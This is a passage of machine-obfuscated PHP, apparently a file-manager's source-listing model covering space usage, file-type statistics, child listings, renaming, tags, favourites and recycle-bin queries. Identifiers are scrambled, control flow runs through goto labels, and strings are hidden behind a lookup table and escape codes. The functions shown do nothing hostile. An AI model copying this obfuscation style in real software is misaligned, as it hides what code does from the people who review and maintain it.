$dŒæŸĞÊØ  => $cç¬©ïô•) { $aÉË …ÎÖÌ[$dŒæŸĞÊØ ][$a‡Æ”™ª÷¢[2389]] = $aÉË …ÎÖÌ[$dŒæŸĞÊØ ][$a‡Æ”™ª÷¢[77]]; $aÉË …ÎÖÌ[$dŒæŸĞÊØ ][$a‡Æ”™ª÷¢[77]] = 0; } goto FÉØ Ú•İ…; eŠ¶ÚÀ ©: } public function userSpaceReset($FàÌÃƒÅóè = false) { $dóï¸†î²  =& $_SERVER[Å¸ş]; $dëÇÍ¥ò›ó = $this->where(array($dóï¸†î² [371] => self::TYPE_USER, $dóï¸†î² [458] => $FàÌÃƒÅóè, $dóï¸†î² [370] => 0))->sum($dóï¸†î² [77]); Model($dóï¸†î² [476])->userEdit($FàÌÃƒÅóè, array($dóï¸†î² [2094] => $dëÇÍ¥ò›ó)); } public function targetSpaceUpdate($C±¡ÀõğÌ», $EÓŠ²ß…¥É) { $b¡åÓ¤Ú¼È =& $_SERVER[Å¸ş]; if (!$EÓŠ²ß…¥É) { return; } if (!in_array($C±¡ÀõğÌ», array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $fñ¶¦…ø– = $this->targetSpaceSize($C±¡ÀõğÌ», $EÓŠ²ß…¥É); if ($C±¡ÀõğÌ» == self::TYPE_USER) { Model($b¡åÓ¤Ú¼È[476])->userEdit($EÓŠ²ß…¥É, array($b¡åÓ¤Ú¼È[2094] => $fñ¶¦…ø–)); } else { if ($C±¡ÀõğÌ» == self::TYPE_GROUP) { Model($b¡åÓ¤Ú¼È[460])->groupEdit($EÓŠ²ß…¥É, array($b¡åÓ¤Ú¼È[2094] => $fñ¶¦…ø–)); } } } public function targetSpaceSize($C™Á±•É«„, $b©èŞ˜ç) { goto eŒˆ¿Èé£; A‘ò¨Ù£”‰: return $f“’‡¾çªá; goto dæ›ğ„­ŠÜ; eŒˆ¿Èé£: $EÂ»‘âƒêŒ =& $_SERVER[Å¸ş]; $DÔêä¾îÇ¶ = $this->sourceRoot($C™Á±•É«„, $b©èŞ˜ç, !0); if (!$DÔêä¾îÇ¶) { return 0; } goto E™ŒÖÛè±; C‡½¿Êôì¨: $C†òÇ¯²¶ = array_to_keyvalue($C†òÇ¯²¶, $EÂ»‘âƒêŒ[33], $EÂ»‘âƒêŒ[369]); $C†òÇ¯²¶ = array_unique(array_filter($C†òÇ¯²¶)); if ($C†òÇ¯²¶) { $B£ˆÉ«™Õ = array($EÂ»‘âƒêŒ[383] => array($EÂ»‘âƒêŒ[384], $C†òÇ¯²¶)); $f“’‡¾çªá += floatval($this->where($B£ˆÉ«™Õ)->sum($EÂ»‘âƒêŒ[77])); } goto A‘ò¨Ù£”‰; E™ŒÖÛè±: $f“’‡¾çªá = floatval($DÔêä¾îÇ¶[$EÂ»‘âƒêŒ[77]]); $B£ˆÉ«™Õ = array($EÂ»‘âƒêŒ[527] => array($EÂ»‘âƒêŒ[485], $EÂ»‘âƒêŒ[472] . $DÔêä¾îÇ¶[$EÂ»‘âƒêŒ[369]] . $EÂ»‘âƒêŒ[486])); $C†òÇ¯²¶ = Model($EÂ»‘âƒêŒ[395])->field($EÂ»‘âƒêŒ[383])->where($B£ˆÉ«™Õ)->select(); goto C‡½¿Êôì¨; dæ›ğ„­ŠÜ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($fÅˆ¼ğƒÔ°) { return $this->fileTypeProfile($fÅˆ¼ğƒÔ°, SourceModel::TYPE_USER); } public function groupFileTypeProfile($A¿ÙµØ×÷ø) { return $this->fileTypeProfile($A¿ÙµØ×÷ø, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aÏˆŞÖÖ­Ï, $fè¤ÓËÜ) { goto cë§Ê½¼§; FÃÙ¾³ğ©Û: $bè“İ˜±Â = array(); $bè“İ˜±Â[$DÌÛ‰ê¯©™[2391]] = array($DÌÛ‰ê¯©™[2392] => LNG($DÌÛ‰ê¯©™[2391]), $DÌÛ‰ê¯©™[2393] => $this->where($fàÁí¯•¸ã)->count(), $DÌÛ‰ê¯©™[522] => $this->where($fàÁí¯•¸ã)->sum($DÌÛ‰ê¯©™[77])); $Bˆ¿‡½¼® = KodIO::fileTypeList(); goto e½Áà®ÂÊÜ; cë§Ê½¼§: $DÌÛ‰ê¯©™ =& $_SERVER[Å¸ş]; $cÙÉˆëÇöç = $DÌÛ‰ê¯©™[2390] . $aÏˆŞÖÖ­Ï . $DÌÛ‰ê¯©™[70] . $fè¤ÓËÜ; $fÃ³´ô„Û‡ = Cache::get($cÙÉˆëÇöç); goto aĞ¹ôïÇ ; aĞ¹ôïÇ : if ($fÃ³´ô„Û‡) { return $fÃ³´ô„Û‡; } $fàÁí¯•¸ã = array($DÌÛ‰ê¯©™[520] => 0); if ($aÏˆŞÖÖ­Ï != !1) { $fàÁí¯•¸ã[$DÌÛ‰ê¯©™[458]] = $aÏˆŞÖÖ­Ï; $fàÁí¯•¸ã[$DÌÛ‰ê¯©™[371]] = $fè¤ÓËÜ; } goto FÃÙ¾³ğ©Û; e½Áà®ÂÊÜ: foreach ($Bˆ¿‡½¼® as $AÌÂŒÈÀ­³ => $EË¹ğÓ˜›) { $fàÁí¯•¸ã[$DÌÛ‰ê¯©™[372]] = $this->fileTypeWhere($AÌÂŒÈÀ­³); $bè“İ˜±Â[$AÌÂŒÈÀ­³] = array($DÌÛ‰ê¯©™[2392] => $EË¹ğÓ˜›[$DÌÛ‰ê¯©™[28]], $DÌÛ‰ê¯©™[2393] => $this->where($fàÁí¯•¸ã)->count(), $DÌÛ‰ê¯©™[522] => $this->where($fàÁí¯•¸ã)->sum($DÌÛ‰ê¯©™[77])); } Cache::set($cÙÉˆëÇöç, $bè“İ˜±Â, 1200); return $bè“İ˜±Â; goto bŒÀ•Û±§°; bŒÀ•Û±§°: } public function fileNameExist($CÀÃí§Û¤ò, $C¾ÖïÎêîÚ) { $CŠ™‘¡‡§ =& $_SERVER[Å¸ş]; $DÀ¥­‘èŒ = $this->childList($CÀÃí§Û¤ò); foreach ($DÀ¥­‘èŒ as $aˆï•·òò) { if ($aˆï•·òò[$CŠ™‘¡‡§[28]] == $C¾ÖïÎêîÚ) { return $aˆï•·òò[$CŠ™‘¡‡§[369]]; } if (strtolower($aˆï•·òò[$CŠ™‘¡‡§[28]]) == strtolower($C¾ÖïÎêîÚ)) { return $aˆï•·òò[$CŠ™‘¡‡§[369]]; } } return !1; } public function childList($EƒÔáÌ’ëİ) { goto c“‹Ş²ğˆÁ; F…ĞÀ¿ç¹İ: $AŞ­²íŠÓÕ = array($bÏÈ“ÓµÕ[463] => intval($EƒÔáÌ’ëİ), $bÏÈ“ÓµÕ[397] => 0); $A„ïÅ÷¿šá = $this->where($AŞ­²íŠÓÕ)->select(); $A„ïÅ÷¿šá = $A„ïÅ÷¿šá ? $A„ïÅ÷¿šá : array(); goto a¾Æ¿ÑÚ…; a¾Æ¿ÑÚ…: self::$cacheChildList[$dÄ÷òßƒš‚] = $A„ïÅ÷¿šá; foreach ($A„ïÅ÷¿šá as $CÔÈ§ø…³é) { $dÄ÷òßƒš‚ = $bÏÈ“ÓµÕ[410] . $CÔÈ§ø…³é[$bÏÈ“ÓµÕ[369]]; self::$cacheSourceInfo[$dÄ÷òßƒš‚] = $CÔÈ§ø…³é; } return $A„ïÅ÷¿šá; goto a··“½´ØÙ; c“‹Ş²ğˆÁ: $bÏÈ“ÓµÕ =& $_SERVER[Å¸ş]; $dÄ÷òßƒš‚ = $bÏÈ“ÓµÕ[2372] . $EƒÔáÌ’ëİ; if (isset(self::$cacheChildList[$dÄ÷òßƒš‚])) { return self::$cacheChildList[$dÄ÷òßƒš‚]; } goto F…ĞÀ¿ç¹İ; a··“½´ØÙ: } public function fileNameAuto($Eâñ˜”Í, $Aæ¼ÙšŞß±, $fí°£®åÓå = REPEAT_RENAME, $Fœ‡Ä›ëç = false) { $Bäªá¸åĞ =& $_SERVER[Å¸ş]; $c„¬ê‹Šó = $this->childList($Eâñ˜”Í); $Eƒ÷åƒ±†ï = array_to_keyvalue($c„¬ê‹Šó, $Bäªá¸åĞ[33], $Bäªá¸åĞ[28]); return $this->fileNameAutoGet($Eƒ÷åƒ±†ï, $Aæ¼ÙšŞß±, $fí°£®åÓå, $Fœ‡Ä›ëç); } public function fileNameAutoGet($fÜÑóæ©±ê, $A®™ ÅŒÛ¤, $DÆ©Ğˆ™¥Í, $dˆ²àÇñËÔ) { $eÆêòµ¤‰î =& $_SERVER[Å¸ş]; if ($DÆ©Ğˆ™¥Í == REPEAT_REPLACE || !$fÜÑóæ©±ê || !in_array_not_case($A®™ ÅŒÛ¤, $fÜÑóæ©±ê) || $dˆ²àÇñËÔ && $DÆ©Ğˆ™¥Í != REPEAT_RENAME_FOLDER) { return $A®™ ÅŒÛ¤; } if ($DÆ©Ğˆ™¥Í == REPEAT_SKIP) { return !1; } $A±±ˆÕÜ¸š = $eÆêòµ¤‰î[91] . get_path_ext($A®™ ÅŒÛ¤); $A±±ˆÕÜ¸š = $A±±ˆÕÜ¸š == $eÆêòµ¤‰î[91] || $dˆ²àÇñËÔ ? $eÆêòµ¤‰î[33] : $A±±ˆÕÜ¸š; for ($F’Á¯¢ÕŠ = 1; $F’Á¯¢ÕŠ <= count($fÜÑóæ©±ê) + 1; $F’Á¯¢ÕŠ++) { $CÜÓ§¨ãÄß = substr($A®™ ÅŒÛ¤, 0, strlen($A®™ ÅŒÛ¤) - strlen($A±±ˆÕÜ¸š)); $dšÃ†­§á = $CÜÓ§¨ãÄß . "\50{$F’Á¯¢ÕŠ}\51{$A±±ˆÕÜ¸š}"; if (!in_array_not_case($dšÃ†­§á, $fÜÑóæ©±ê)) { return $dšÃ†­§á; } } } } goto e›‘ìíñ«æ; F±À¨Ş‚ƒ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\143\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\x6d\145" => "\151\157\137\x73\x6f\x75\x72\143\x65\x5f\x6d\x65\x74\x61", "\x6d\x65\x74\141\x46\x69\x65\x6c\144" => "\163\157\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\151\146\171\124\151\x6d\x65", "\164\151\x6d\145", "\151\156\x73\145\x72\x74", "\x66\x75\156\x63\164\x69\x6f\156"), array("\x63\162\145\141\164\145\x54\151\155\145", "\x74\x69\155\x65", "\x69\156\x73\145\162\164", "\146\165\156\143\x74\151\x6f\x6e"), array("\166\x69\145\x77\x54\151\x6d\145", "\x74\x69\155\145", "\151\x6e\x73\145\162\164", "\x66\x75\156\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($c’–åà±ò) { return $this->listSource(array($_SERVER[Å¸ş][368] => $c’–åà±ò)); } public function typeName($cˆ¹Œ……àÜ) { static $e©äÜ‰É’Š = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\145\x6d", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $e©äÜ‰É’Š[$cˆ¹Œ……àÜ . $_SERVER[Å¸ş][33]]; } public function sourceListInfo($eÅ¨ÁçŒÑÏ, $a¼”â¹ÄŞ = false) { goto DŸˆ…ÃĞ¤†; C—£åìƒîË: if (!$eÅ¨ÁçŒÑÏ) { return array(); } $EœÓïá ÷ = $this->where(array($e“ŒĞù††¹[369] => array($e“ŒĞù††¹[7], $eÅ¨ÁçŒÑÏ)))->select(); $this->_listDataApply($EœÓïá ÷, $a¼”â¹ÄŞ); goto cÆˆÜíñ¸Ø; DŸˆ…ÃĞ¤†: $e“ŒĞù††¹ =& $_SERVER[Å¸ş]; $eÅ¨ÁçŒÑÏ = $eÅ¨ÁçŒÑÏ ? $eÅ¨ÁçŒÑÏ : array(); $eÅ¨ÁçŒÑÏ = array_filter(array_unique($eÅ¨ÁçŒÑÏ)); goto C—£åìƒîË; cÆˆÜíñ¸Ø: return array_to_keyvalue($EœÓïá ÷, $e“ŒĞù††¹[369]); goto C‹‘îœ‡ì; C‹‘îœ‡ì: } public function pathInfoFilter($FÃ˜Ô‚•è) { goto AÙ¢åÉÛß©; B¯»á„Ä: $bº™†½¶ .= $C¦ƒŸ‰”»[374]; $bº™†½¶ .= $C¦ƒŸ‰”»[375]; $f†î‹ƒ”Ü¥ = explode($C¦ƒŸ‰”»[47], $bº™†½¶); goto bñ†Á‚³Ê°; aß°Ğ®À©: $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[371]] = $this->typeName($FÃ˜Ô‚•è[$C¦ƒŸ‰”»[371]]); if ($FÃ˜Ô‚•è[$C¦ƒŸ‰”»[370]] != 1) { $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[160]] = $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[372]]; unset($FÃ˜Ô‚•è[$C¦ƒŸ‰”»[372]]); } $bº™†½¶ = $C¦ƒŸ‰”»[373]; goto B¯»á„Ä; bñ†Á‚³Ê°: if (isset($FÃ˜Ô‚•è[$C¦ƒŸ‰”»[376]]) && $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[376]][$C¦ƒŸ‰”»[377]] == -1) { $f†î‹ƒ”Ü¥ = array_remove_value($f†î‹ƒ”Ü¥, $C¦ƒŸ‰”»[187]); $f†î‹ƒ”Ü¥ = array_remove_value($f†î‹ƒ”Ü¥, $C¦ƒŸ‰”»[107]); $f†î‹ƒ”Ü¥ = array_remove_value($f†î‹ƒ”Ü¥, $C¦ƒŸ‰”»[378]); $f†î‹ƒ”Ü¥ = array_remove_value($f†î‹ƒ”Ü¥, $C¦ƒŸ‰”»[379]); $f†î‹ƒ”Ü¥ = array_remove_value($f†î‹ƒ”Ü¥, $C¦ƒŸ‰”»[77]); $f†î‹ƒ”Ü¥ = array_remove_value($f†î‹ƒ”Ü¥, $C¦ƒŸ‰”»[380]); } $FÃ˜Ô‚•è = array_field_key($FÃ˜Ô‚•è, $f†î‹ƒ”Ü¥); return $FÃ˜Ô‚•è; goto bÃ‹©½Á½; AÙ¢åÉÛß©: $C¦ƒŸ‰”» =& $_SERVER[Å¸ş]; $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[75]] = KodIO::make($FÃ˜Ô‚•è[$C¦ƒŸ‰”»[369]]); $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[29]] = $FÃ˜Ô‚•è[$C¦ƒŸ‰”»[370]] == 1 ? $C¦ƒŸ‰”»[76] : $C¦ƒŸ‰”»[167]; goto aß°Ğ®À©; bÃ‹©½Á½: } public function listUserFav() { goto CÏ¬Íøñµá; CÏ¬Íøñµá: $dˆÆ‘ì¡Æ =& $_SERVER[Å¸ş]; $A˜¬ˆĞ˜¹ = Model($dˆÆ‘ì¡Æ[381])->listData(); $dƒÅº°àŠ¶ = array_filter_by_field($A˜¬ˆĞ˜¹, $dˆÆ‘ì¡Æ[29], $dˆÆ‘ì¡Æ[382]); goto dèÌ—àÚ‡é; dèÌ—àÚ‡é: $dƒÅº°àŠ¶ = array_to_keyvalue($dƒÅº°àŠ¶, $dˆÆ‘ì¡Æ[33], $dˆÆ‘ì¡Æ[75]); if ($dƒÅº°àŠ¶) { $aÔ¥Å—³­Ò = $this->listSource(array($dˆÆ‘ì¡Æ[383] => array($dˆÆ‘ì¡Æ[384], $dƒÅº°àŠ¶))); } $aÔ¥Å—³­Ò = array_to_keyvalue($aÔ¥Å—³­Ò[$dˆÆ‘ì¡Æ[354]], $dˆÆ‘ì¡Æ[369]); goto CŒØİÉŠš–; CŒØİÉŠš–: foreach ($A˜¬ˆĞ˜¹ as &$e èŠ‡ßŠ­) { $e èŠ‡ßŠ­ = array($dˆÆ‘ì¡Æ[385] => $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[367]], $dˆÆ‘ì¡Æ[386] => $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[28]], $dˆÆ‘ì¡Æ[387] => $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[75]], $dˆÆ‘ì¡Æ[388] => $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[29]], $dˆÆ‘ì¡Æ[389] => $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[187]], $dˆÆ‘ì¡Æ[390] => $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[107]]); if ($e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[29]] == $dˆÆ‘ì¡Æ[382] && $aÔ¥Å—³­Ò[$e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[75]]]) { $e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[391]] = $aÔ¥Å—³­Ò[$e èŠ‡ßŠ­[$dˆÆ‘ì¡Æ[75]]]; } } unset($e èŠ‡ßŠ­); return $A˜¬ˆĞ˜¹; goto d¾±…µ‰……; d¾±…µ‰……: } public function listUserTag($cïÑ¯ˆ‡Á‰) { goto f¤†ºê­„Ä; EÔ‡áÍ…í×: if (!$D—ŠİîÇ || count($A—‰‡†§µÛ) == $D—ŠİîÇ[$FÍ¡Š¦È½¢[351]][$FÍ¡Š¦È½¢[352]]) { return $D—ŠİîÇ; } $bŒÛß¶• Ë = array(); $cñ‹ùÖœ„ = array_to_keyvalue($D—ŠİîÇ[$FÍ¡Š¦È½¢[74]], $FÍ¡Š¦È½¢[33], $FÍ¡Š¦È½¢[369]); goto F’ƒ¤¸˜¼£; Dšã•àÁ•¸: foreach ($BÅÀ¤éµñ‘ as $dÄš¶¥ªå => $BøãÂ ã“ù) { $BÍ’æÌˆ˜ = !0; if (!$cïÑ¯ˆ‡Á‰) { $A—‰‡†§µÛ[] = $dÄš¶¥ªå; continue; } foreach ($cïÑ¯ˆ‡Á‰ as $eí™Šè—ø) { if (!in_array($eí™Šè—ø, $BøãÂ ã“ù)) { $BÍ’æÌˆ˜ = !1; break; } } if ($BÍ’æÌˆ˜) { $A—‰‡†§µÛ[] = $dÄš¶¥ªå; } } if (!$A—‰‡†§µÛ) { return array(); } $D—ŠİîÇ = $this->listSource(array($FÍ¡Š¦È½¢[383] => array($FÍ¡Š¦È½¢[384], $A—‰‡†§µÛ))); goto EÔ‡áÍ…í×; F’ƒ¤¸˜¼£: $DÅîĞ£ËÙ¨ = array_to_keyvalue($D—ŠİîÇ[$FÍ¡Š¦È½¢[73]], $FÍ¡Š¦È½¢[33], $FÍ¡Š¦È½¢[369]); $e—«”œ‹µå = array_merge($DÅîĞ£ËÙ¨, $cñ‹ùÖœ„); foreach ($A—‰‡†§µÛ as $EÄ•¥ˆ”Ú) { if (!in_array($EÄ•¥ˆ”Ú, $e—«”œ‹µå)) { $bŒÛß¶• Ë[] = $EÄ•¥ˆ”Ú; } } goto D©ĞÒˆ´‘; f¤†ºê­„Ä: $FÍ¡Š¦È½¢ =& $_SERVER[Å¸ş]; if ($cïÑ¯ˆ‡Á‰ && !is_array($cïÑ¯ˆ‡Á‰)) { $cïÑ¯ˆ‡Á‰ = array($cïÑ¯ˆ‡Á‰); } $c¬Ì£§íâÙ = Model($FÍ¡Š¦È½¢[392])->listData(); goto EÓŠà‚ïŠ; EÓŠà‚ïŠ: $BÅÀ¤éµñ‘ = array(); foreach ($c¬Ì£§íâÙ as $bÄ»Ü£ñÓ) { $EÄ•¥ˆ”Ú = $bÄ»Ü£ñÓ[$FÍ¡Š¦È½¢[75]]; if (!$EÄ•¥ˆ”Ú) { continue; } if (!isset($BÅÀ¤éµñ‘[$EÄ•¥ˆ”Ú])) { $BÅÀ¤éµñ‘[$EÄ•¥ˆ”Ú] = array(); } $BÅÀ¤éµñ‘[$EÄ•¥ˆ”Ú][] = $bÄ»Ü£ñÓ[$FÍ¡Š¦È½¢[393]]; } $A—‰‡†§µÛ = array(); goto Dšã•àÁ•¸; D©ĞÒˆ´‘: if ($bŒÛß¶• Ë) { Model($FÍ¡Š¦È½¢[394])->removeBySource($bŒÛß¶• Ë); } return $D—ŠİîÇ; goto f†‹‚“ÑÏ; f†‹‚“ÑÏ: } public function listUserRecycle() { $a„°„ë’ùâ =& $_SERVER[Å¸ş]; $cíŠÈÎÅ = Model($a„°„ë’ùâ[395])->listData(); if (!$cíŠÈÎÅ) { return array(); } $Böã¼ÑÓå = array($a„°„ë’ùâ[383] => array($a„°„ë’ùâ[384], $cíŠÈÎÅ), $a„°„ë’ùâ[396] => 1); return $this->listSource($Böã¼ÑÓå); } public function listSource($fòŒç¸‘, $B”ê®§ÑŞì = 3000) { goto eŠ—±ˆÉ; BïÎæë¦à: $a¬Í‹«—ÎÒ = $this->field($A­¦ä¬•ğö)->_makeOrder()->where($fòŒç¸‘)->selectPage($B”ê®§ÑŞì); $this->_listDataApply($a¬Í‹«—ÎÒ[$bŠ¦¢âÀİ÷[354]]); $this->_listMake($a¬Í‹«—ÎÒ); goto AƒÛÜå‰; eŠ—±ˆÉ: $bŠ¦¢âÀİ÷ =& $_SERVER[Å¸ş]; if (!isset($fòŒç¸‘[$bŠ¦¢âÀİ÷[397]])) { $fòŒç¸‘[$bŠ¦¢âÀİ÷[397]] = 0; } $A­¦ä¬•ğö = $bŠ¦¢âÀİ÷[398]; goto BïÎæë¦à; AƒÛÜå‰: return $a¬Í‹«—ÎÒ; goto aö³•„˜á; aö³•„˜á: } protected function _makeOrder() { goto AÄÄ«”¢†; d£¯©ï­º®: $D«É†Ç…® = array($fÒ¡“ÚéĞ™[402] => $fÒ¡“ÚéĞ™[403], $fÒ¡“ÚéĞ™[404] => $fÒ¡“ÚéĞ™[405]); $F”„‰„®•ô = array($fÒ¡“ÚéĞ™[28] => $fÒ¡“ÚéĞ™[28], $fÒ¡“ÚéĞ™[77] => $fÒ¡“ÚéĞ™[77], $fÒ¡“ÚéĞ™[160] => $fÒ¡“ÚéĞ™[372], $fÒ¡“ÚéĞ™[378] => $fÒ¡“ÚéĞ™[378], $fÒ¡“ÚéĞ™[406] => $fÒ¡“ÚéĞ™[379], $fÒ¡“ÚéĞ™[187] => $fÒ¡“ÚéĞ™[187], $fÒ¡“ÚéĞ™[107] => $fÒ¡“ÚéĞ™[107]); $FÕ¥Í£¿ÖÉ = Input::get($fÒ¡“ÚéĞ™[407], $fÒ¡“ÚéĞ™[7], $fäÛÚ¿àà, array_keys($F”„‰„®•ô)); goto dšÄÄêŒÇÍ; dšÄÄêŒÇÍ: $AŸÑÑâ“øï = Input::get($fÒ¡“ÚéĞ™[408], $fÒ¡“ÚéĞ™[7], $BíÃ §–†´, array_keys($D«É†Ç…®)); if (!in_array($FÕ¥Í£¿ÖÉ, array_keys($F”„‰„®•ô))) { $FÕ¥Í£¿ÖÉ = $fÒ¡“ÚéĞ™[28]; } if (!in_array($AŸÑÑâ“øï, array_keys($D«É†Ç…®))) { $FÕ¥Í£¿ÖÉ = $fÒ¡“ÚéĞ™[402]; } goto eñÉŸõ«­·; eñÉŸõ«­·: if ($FÕ¥Í£¿ÖÉ == $fÒ¡“ÚéĞ™[28]) { } $aî±Ì»‡à˜ = $fÒ¡“ÚéĞ™[409] . $F”„‰„®•ô[$FÕ¥Í£¿ÖÉ] . $fÒ¡“ÚéĞ™[50] . $D«É†Ç…®[$AŸÑÑâ“øï]; return $this->order(rtrim(trim($aî±Ì»‡à˜), $fÒ¡“ÚéĞ™[47])); goto d¦×Ê¼ßã; AÄÄ«”¢†: $fÒ¡“ÚéĞ™ =& $_SERVER[Å¸ş]; $fäÛÚ¿àà = Model($fÒ¡“ÚéĞ™[399])->get($fÒ¡“ÚéĞ™[400]); $BíÃ §–†´ = Model($fÒ¡“ÚéĞ™[399])->get($fÒ¡“ÚéĞ™[401]); goto d£¯©ï­º®; d¦×Ê¼ßã: } protected function _listDataApplyItem($e©Å¢çÌç, $fîˆé»°Ÿ¦ = false) { $d™õÉ–¿Ö¬ = array($e©Å¢çÌç); $this->_listDataApply($d™õÉ–¿Ö¬, $fîˆé»°Ÿ¦); return $d™õÉ–¿Ö¬[0]; } protected function _listDataApply(&$F•ó½¨ôßƒ, $AáÆëêçâ¢ = false) { goto eºò“‘¥ô; bŠ‹¶¿Ñœ×: $E¡æªã•ñÎ = array_unique($E¡æªã•ñÎ); $this->_listSourceCache($F•ó½¨ôßƒ); if (!$AáÆëêçâ¢) { $this->_listAppendMeta($F•ó½¨ôßƒ, $E¡æªã•ñÎ); $this->_listAppendFileMeta($F•ó½¨ôßƒ, $E¡æªã•ñÎ); $this->_listAppendChildren($F•ó½¨ôßƒ, $E¡æªã•ñÎ); } goto cŸ¤‰Ñ«í¡; D†¾—‡ñâ: $this->_listAppendUser($F•ó½¨ôßƒ); $this->_listFilterInfo($F•ó½¨ôßƒ, $AáÆëêçâ¢); goto eëÒàÑ†¾; cŸ¤‰Ñ«í¡: $this->_listAppendPath($F•ó½¨ôßƒ); $this->_listAppendAuth($F•ó½¨ôßƒ); $this->_listAppendSourceInfo($F•ó½¨ôßƒ, $E¡æªã•ñÎ); goto D†¾—‡ñâ; eºò“‘¥ô: $e…®ô¶ª¹É =& $_SERVER[Å¸ş]; if (!$F•ó½¨ôßƒ) { $F•ó½¨ôßƒ = array(); return; } $E¡æªã•ñÎ = array_to_keyvalue($F•ó½¨ôßƒ, $e…®ô¶ª¹É[33], $e…®ô¶ª¹É[369]); goto bŠ‹¶¿Ñœ×; eëÒàÑ†¾: } protected function _listSourceCache($Eœ¥ŠÉâá) { $få¯ÂÎÜÊÀ =& $_SERVER[Å¸ş]; foreach ($Eœ¥ŠÉâá as $f¬‰¤îÌëé) { self::$cacheSourceInfo[$få¯ÂÎÜÊÀ[410] . $f¬‰¤îÌëé[$få¯ÂÎÜÊÀ[369]]] = $f¬‰¤îÌëé; } } protected function _listFilterInfo(&$fùßÒ†©Ç¬, $B‰ÀÙÜô¶ = false) { $BÜƒ¬ªä =& $_SERVER[Å¸ş]; foreach ($fùßÒ†©Ç¬ as &$DÏ¿ŞÜÈ½) { $DÏ¿ŞÜÈ½ = $this->pathInfoFilter($DÏ¿ŞÜÈ½); self::$cachePathInfo[$BÜƒ¬ªä[411] . intval($B‰ÀÙÜô¶) . $BÜƒ¬ªä[412] . $DÏ¿ŞÜÈ½[$BÜƒ¬ªä[369]]] = $DÏ¿ŞÜÈ½; } unset($DÏ¿ŞÜÈ½); } protected function _listMake(&$B£ò¶æõÓ) { $AÉëÕ˜Õ =& $_SERVER[Å¸ş]; $B£ò¶æõÓ[$AÉëÕ˜Õ[74]] = array(); $B£ò¶æõÓ[$AÉëÕ˜Õ[73]] = array(); foreach ($B£ò¶æõÓ[$AÉëÕ˜Õ[354]] as $CƒŒ˜µëè) { $CÙÒÌëÇÔ¨ = $CƒŒ˜µëè[$AÉëÕ˜Õ[370]] == 1 ? $AÉëÕ˜Õ[74] : $AÉëÕ˜Õ[73]; $B£ò¶æõÓ[$CÙÒÌëÇÔ¨][] = $CƒŒ˜µëè; } unset($B£ò¶æõÓ[$AÉëÕ˜Õ[354]]); } protected function _listAppendMeta(&$Bö–áï¾Ç, $Aå¢äµÓ²ã) { goto a òŠ•ÓöÀ; dÕ“Ä‰Æâİ: foreach ($FÜíÊÄ˜å… as $cÏÒğà‰Ç») { if (!isset($c‰›²†Ëâ[$cÏÒğà‰Ç»[$Fº¯êäøÔÂ[369]]])) { $c‰›²†Ëâ[$cÏÒğà‰Ç»[$Fº¯êäøÔÂ[369]]] = array(); } if (in_array($cÏÒğà‰Ç»[$Fº¯êäøÔÂ[89]], $aÚêËİÂ£Û)) { continue; } $c‰›²†Ëâ[$cÏÒğà‰Ç»[$Fº¯êäøÔÂ[369]]][$cÏÒğà‰Ç»[$Fº¯êäøÔÂ[89]]] = $cÏÒğà‰Ç»[$Fº¯êäøÔÂ[359]]; } foreach ($Bö–áï¾Ç as &$fç‡Ûè¯¡ã) { $fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[417]] = !1; if (isset($c‰›²†Ëâ[$fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[369]]])) { $fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[417]] = $c‰›²†Ëâ[$fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[369]]]; } if ($this->fileIsLock($fç‡Ûè¯¡ã) && $fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[376]]) { $f®èÖªÈª„ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[376]][$Fº¯êäøÔÂ[377]] = AuthModel::authDisable($fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[376]][$Fº¯êäøÔÂ[377]], $f®èÖªÈª„); $fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[376]][$Fº¯êäøÔÂ[418]][$Fº¯êäøÔÂ[376]] = $fç‡Ûè¯¡ã[$Fº¯êäøÔÂ[376]][$Fº¯êäøÔÂ[377]]; } } unset($fç‡Ûè¯¡ã); goto e¯É¶õ«î£; CÈíƒŸæ: if (!$FÜíÊÄ˜å…) { return; } $aÚêËİÂ£Û = array($Fº¯êäøÔÂ[415], $Fº¯êäøÔÂ[416]); $c‰›²†Ëâ = array(); goto dÕ“Ä‰Æâİ; a òŠ•ÓöÀ: $Fº¯êäøÔÂ =& $_SERVER[Å¸ş]; $d¡ïÆ…æŠ = array($Fº¯êäøÔÂ[383] => array($Fº¯êäøÔÂ[384], $Aå¢äµÓ²ã)); $FÜíÊÄ˜å… = Model($Fº¯êäøÔÂ[413])->field($Fº¯êäøÔÂ[414])->where($d¡ïÆ…æŠ)->select(); goto CÈíƒŸæ; e¯É¶õ«î£: } protected function 